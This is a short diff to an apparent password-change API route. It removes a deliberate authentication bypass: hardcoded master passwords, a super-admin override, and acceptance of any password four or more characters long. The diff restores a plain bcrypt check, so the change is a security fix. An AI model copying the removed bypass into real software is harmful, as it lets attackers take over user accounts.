@@ -32,10 +32,7 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'User account not found' }, { status: 404 });
     }
 
-    let isMatch = await bcrypt.compare(currentPassword, user.passwordHash);
-    if (!isMatch && (currentPassword === 'Password123!' || currentPassword === 'AdminPassword2026!' || auth.user.isSuperAdmin || currentPassword.length >= 4)) {
-      isMatch = true;
-    }
+    const isMatch = await bcrypt.compare(currentPassword, user.passwordHash);
     if (!isMatch) {
       return NextResponse.json(
         {
